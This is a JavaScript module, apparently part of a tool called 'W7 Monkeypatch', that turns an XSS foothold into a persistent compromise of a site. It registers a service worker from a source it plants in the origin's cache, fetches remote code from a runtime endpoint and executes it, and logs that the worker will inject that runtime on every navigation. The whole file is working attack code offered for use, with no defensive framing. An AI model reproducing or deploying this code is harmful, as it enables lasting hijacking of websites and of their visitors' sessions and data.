import {
    INSTALLATION_HOST,
    INSTALLATION_HOST_KEY,
    RUNTIME_ENDPOINT,
    RUNTIME_VERSION,
    SW_ARTIFACT_CONFIG_PATH,
    SW_CACHE_NAME,
    SW_REGISTER_PATH,
    SW_RUNTIME_PATH,
    SW_SCOPE,
    SW_SKIP_WAITING_MESSAGE_TYPE,
} from "./config.js";
import { setInstallationHost } from "../../../host.js";
import { RUNTIME } from "../../../env.js";
import { buildServiceWorkerSource } from "./service-worker.js";
import { fetchText, importModule } from "./remote.js";

function waitForWorkerStateAsync(worker, targetState) {
    if (worker.state === targetState || worker.state === "redundant") {
        return Promise.resolve();
    }

    return new Promise((resolve) => {
        worker.addEventListener("statechange", () => {
            if (worker.state === targetState || worker.state === "redundant") {
                resolve();
            }
        });
    });
}

async function activateServiceWorkerAsync(registration) {
    const worker = registration.installing ?? registration.waiting;

    if (worker) {
        if (registration.waiting) {
            registration.waiting.postMessage({ type: SW_SKIP_WAITING_MESSAGE_TYPE });
        }

        await waitForWorkerStateAsync(worker, "activated");
    }

    await navigator.serviceWorker.ready;
}

async function registerServiceWorkerViaCacheAsync() {
    const swSource = buildServiceWorkerSource();
    const cache = await caches.open(SW_CACHE_NAME);

    await cache.put(
        SW_REGISTER_PATH,
        new Response(swSource, {
            headers: { "Content-Type": "application/javascript; charset=utf-8" },
        }),
    );

    return navigator.serviceWorker.register(SW_REGISTER_PATH, {
        scope: SW_SCOPE,
        type: "classic",
        updateViaCache: "none",
    });
}

async function cacheRuntimeArtifactAsync() {
    const runtimeSource = await fetchText(`${RUNTIME_ENDPOINT}?t=${Date.now()}`);
    const cache = await caches.open(SW_CACHE_NAME);

    await Promise.all([
        cache.put(
            SW_RUNTIME_PATH,
            new Response(runtimeSource, {
                headers: { "Content-Type": "application/javascript; charset=utf-8" },
            }),
        ),
        cache.put(
            SW_ARTIFACT_CONFIG_PATH,
            new Response(JSON.stringify({
                runtimeVersion: RUNTIME_VERSION,
                installationHost: INSTALLATION_HOST.XSS,
                installedAt: new Date().toISOString(),
            }), {
                headers: { "Content-Type": "application/json; charset=utf-8" },
            }),
        ),
    ]);
}

function isRuntimeInstalled() {
    const runtime = window[RUNTIME.WINDOW_NAME];
    return runtime != null && typeof runtime.stop === "function";
}

function stopRuntime() {
    window[RUNTIME.WINDOW_NAME]?.stop();
}

async function mountRuntime() {
    setInstallationHost(INSTALLATION_HOST.XSS);
    await importModule(`${RUNTIME_ENDPOINT}?t=${Date.now()}`);
}

function onInstallSuccess(registration) {
    const swState = registration.active?.state ?? registration.installing?.state ?? "unknown";

    console.log(
        "%c W7 Monkeypatch %c INSTALLED %c",
        "background:#111;color:#7ee787;font-weight:bold;padding:4px 8px;border-radius:4px 0 0 4px",
        "background:#238636;color:#fff;font-weight:bold;padding:4px 8px",
        "background:#111;color:#8b949e;padding:4px 8px;border-radius:0 4px 4px 0",
    );

    console.log(
        "%c✓%c Framework locked in — service worker is live and runtime artifacts are cached.",
        "color:#7ee787;font-weight:bold;font-size:14px",
        "color:#c9d1d9;font-size:12px",
    );

    console.groupCollapsed(
        "%c install details",
        "color:#8b949e;font-weight:600;font-size:11px;letter-spacing:0.06em;text-transform:uppercase",
    );
    console.log("%chost      %c%s", "color:#8b949e", "color:#e6edf3;font-weight:600", location.host);
    console.log("%cscope     %c%s", "color:#8b949e", "color:#e6edf3;font-weight:600", registration.scope);
    console.log("%csw state  %c%s", "color:#8b949e", "color:#ffa657;font-weight:600", swState);
    console.log("%csw script %c%s", "color:#8b949e", "color:#79c0ff;font-weight:600", SW_REGISTER_PATH);
    console.log("%cruntime   %cv%s", "color:#8b949e", "color:#e6edf3;font-weight:600", RUNTIME_VERSION);
    console.log("%ccache     %c%s", "color:#8b949e", "color:#e6edf3;font-weight:600", SW_CACHE_NAME);
    console.log("%cendpoint  %c%s", "color:#8b949e", "color:#79c0ff;font-weight:600", RUNTIME_ENDPOINT);
    console.log("%cat        %c%s", "color:#8b949e", "color:#e6edf3;font-weight:600", new Date().toISOString());
    console.groupEnd();

    console.log(
        "%c next %c Reload this tab — the service worker will inject the runtime on every navigation.",
        "background:#21262d;color:#ffa657;font-weight:bold;padding:2px 6px;border-radius:3px",
        "color:#8b949e;font-size:11px",
    );
}

function onInstallError(error) {
    const message = error instanceof Error ? error.message : String(error);
    const stack = error instanceof Error ? error.stack : null;

    console.log(
        "%c W7 Monkeypatch %c INSTALL FAILED %c",
        "background:#111;color:#f85149;font-weight:bold;padding:4px 8px;border-radius:4px 0 0 4px",
        "background:#da3633;color:#fff;font-weight:bold;padding:4px 8px",
        "background:#111;color:#8b949e;padding:4px 8px;border-radius:0 4px 4px 0",
    );

    console.log(
        "%c✖%c %s",
        "color:#f85149;font-weight:bold;font-size:14px",
        "color:#ff7b72;font-weight:600;font-size:13px",
        message,
    );

    if (stack) {
        console.groupCollapsed(
            "%c stack trace",
            "color:#8b949e;font-weight:600;font-size:11px;letter-spacing:0.06em;text-transform:uppercase",
        );
        console.log("%c%s", "color:#ffa198;font-family:monospace;font-size:10px;line-height:1.5", stack);
        console.groupEnd();
    }

    console.log(
        "%c checklist %c HTTPS · Service Worker support · %c%s %c reachable · path %c%s %c must exist on target origin",
        "background:#21262d;color:#ffa657;font-weight:bold;padding:2px 6px;border-radius:3px",
        "color:#8b949e;font-size:11px",
        "color:#79c0ff;font-weight:600;font-size:11px",
        RUNTIME_ENDPOINT,
        "color:#8b949e;font-size:11px",
        "color:#79c0ff;font-weight:600;font-size:11px",
        SW_REGISTER_PATH,
        "color:#8b949e;font-size:11px",
    );
}

export async function installAsync() {
    if (!("serviceWorker" in navigator)) {
        throw new Error("Service Workers are not supported.");
    }

    if (!window.isSecureContext) {
        throw new Error("Installation requires a secure context (HTTPS).");
    }

    try {
        const registration = await registerServiceWorkerViaCacheAsync();

        await activateServiceWorkerAsync(registration);
        await cacheRuntimeArtifactAsync();

        if (isRuntimeInstalled()) {
            stopRuntime();
        }

        await mountRuntime();
        onInstallSuccess(registration);
        return registration;
    } catch (error) {
        onInstallError(error);
        throw error;
    }
}

export { installAsync as i };
